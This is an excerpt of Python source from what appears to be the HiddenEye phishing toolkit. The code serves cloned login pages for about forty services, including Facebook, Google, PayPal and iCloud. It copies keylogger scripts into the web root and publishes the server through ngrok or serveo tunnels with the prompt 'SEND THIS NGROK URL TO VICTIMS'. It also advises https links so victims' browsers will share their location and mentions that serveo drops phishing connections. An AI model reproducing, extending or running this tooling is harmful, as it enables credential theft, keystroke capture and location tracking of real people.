...
def runPhishing(page, customOption):  # Phishing pages selection menu
    ...
    system(
        "cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url"
    )
    if customOption == "1" and page == "Facebook":
        ...
        print(
            "\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(
                MAIN0, MAIN4
            )
        )
        print(
            "\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(
                MAIN0, MAIN4
            )
        )
        input(
            "\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(
                MAIN0, MAIN4
            )
        )
        print(
        ...
        print(
            "\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(
                MAIN0, MAIN4
            )
        )
        print(
            "\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(
                MAIN0, MAIN4
            )
        )
        input(
    ...
    # Tools Below && Phishing Pages Above
        ...
        print(
            "\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked.".format(
                MAIN0, MAIN4
            )
        )
        input("\nPress Enter To continue...")
...
def runLocalhost(port):
    ...
    print(
        "\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(
            MAIN0, MAIN4
        )
    )
    host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
        ...
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print(
                "\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
                    MAIN0, MAIN2, MAIN3, port
                )
                + url
                + "{1}".format(MAIN0, MAIN4, MAIN3)
            )
            print("\n")
            break
...
def runServeo(port):
    print(
        ...
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. """.format(
            MAIN0, MAIN2
        )
    )
    print(
        "\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(
            MAIN0, MAIN2
        )
    )
    print(
...
def customServeo(port):
    ...
    if not ".serveo.net" in lnk:
        ...
        pass
    system(
        "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &"
        % (lnk, port)
    )
    sleep(7)
    try:
...
________________________________________________________________________________""".format(
            MAIN3, MAIN4, MAIN2, MAIN0, version
        )
    )
    print(
    ...
    print(
        " {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}02{0}]{1} Google         {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}03{0}]{1} LinkedIn       {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt       {0}[{1}39{0}]{1} CUSTOM(1)".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}04{0}]{1} GitHub         {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox         {0}[{1}40{0}]{1} CUSTOM(2)".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}05{0}]{1} StackOverflow  {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}06{0}]{1} WordPress      {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}07{0}]{1} Twitter        {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}08{0}]{1} Instagram      {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}09{0}]{1} Snapchat       {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ".format(
            MAIN0, MAIN2
        )
    )
    print(
        " {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
            MAIN0, MAIN2
        )
    )
...
def inputCustom():  # Question where user can input custom web-link
    ...
    print(
        """\n{1}**{0}(Do not leave it blank. Unless Errors may occur)""".format(
            MAIN2, MAIN4
        )
    )
...
def addingEmail():
    ...
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
    if choice == "Y":
        print(
...
def emailConfig():
    ...
    with open("Defs/Send_Email/emailconfig.py") as f:
        ...
        print(
            "\n\n{0}[{1}SUCCESS{0}]{0}: Created Config File & Saved To (Defs/Send_Email/Config.py)".format(
                MAIN0, MAIN4
            )
        )
...
def addCloudfare():
    system(
        "mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html"
    )
...
def writeLog(ctx):  # Writing log
    if (
        config.get("Settings", "DidBackground") == "True"
    ):  # if didBackground == True, write
        logFile.write(
            ctx.replace(MAIN0, "")
            .replace(MAIN1, "")
            .replace(MAIN2, "")
